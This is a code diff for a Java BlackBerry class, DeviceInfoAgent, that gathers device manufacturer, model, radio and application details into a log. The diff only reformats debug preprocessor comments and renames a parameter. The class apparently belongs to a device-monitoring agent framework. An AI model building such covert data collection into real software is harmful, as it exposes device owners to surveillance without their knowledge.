@@ -37,9 +37,9 @@ import blackberry.utils.Check;
  * The Class DeviceInfoAgent.
  */
 public final class DeviceInfoAgent extends Agent {
-    // #ifdef DEBUG
+    //#ifdef DEBUG
     static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);
-    // #endif
+    //#endif
 
     Device device;
     boolean runningApplication;
@@ -51,8 +51,8 @@ public final class DeviceInfoAgent extends Agent {
      * @param agentStatus
      *            the agent status
      */
-    public DeviceInfoAgent(final boolean agentStatus) {
-        super(AGENT_DEVICE, agentStatus, Conf.AGENT_DEVICEINFO_ON_SD,
+    public DeviceInfoAgent(final boolean agentEnabled) {
+        super(AGENT_DEVICE, agentEnabled, Conf.AGENT_DEVICEINFO_ON_SD,
                 "DeviceInfoAgent");
         //#ifdef DBC
         Check.asserts(Log.convertTypeLog(agentId) == LogType.DEVICE,
@@ -96,9 +96,9 @@ public final class DeviceInfoAgent extends Agent {
             sb.append("Simulator\n");
         }
 
-        // #ifdef DEBUG
+        //#ifdef DEBUG
         sb.append("Debug\n");
-        // #endif
+        //#endif
 
         sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
         sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
@@ -153,9 +153,9 @@ public final class DeviceInfoAgent extends Agent {
                     + RadioInfo.isDataServiceSuspended() + "\n");
             // sb.append(": " + RadioInfo.);
         } catch (final Exception ex) {
-            // #ifdef DEBUG
+            //#ifdef DEBUG
             debug.error("Radio: " + ex);
-            // #endif
+            //#endif
         }
 
         // Device
@@ -185,17 +185,17 @@ public final class DeviceInfoAgent extends Agent {
                 // sb.append(getInstalledApplications());
             }
         } catch (final Exception ex) {
-            // #ifdef DEBUG
+            //#ifdef DEBUG
             debug.error(ex);
-            // #endif
+            //#endif
         }
 
         ret = log.writeLog(sb.toString(), true);
 
         if (ret == false) {
-            // #ifdef DEBUG
+            //#ifdef DEBUG
             debug.error("Error writing file");
-            // #endif
+            //#endif
         }
 
         log.close();
@@ -395,10 +395,9 @@ public final class DeviceInfoAgent extends Agent {
             return false;
         }
 
-        // #ifdef DEBUG
+        //#ifdef DEBUG
         debug.info("installedApplication: " + installedApplication);
-
-        // #endif
+        //#endif
 
         return true;
     }
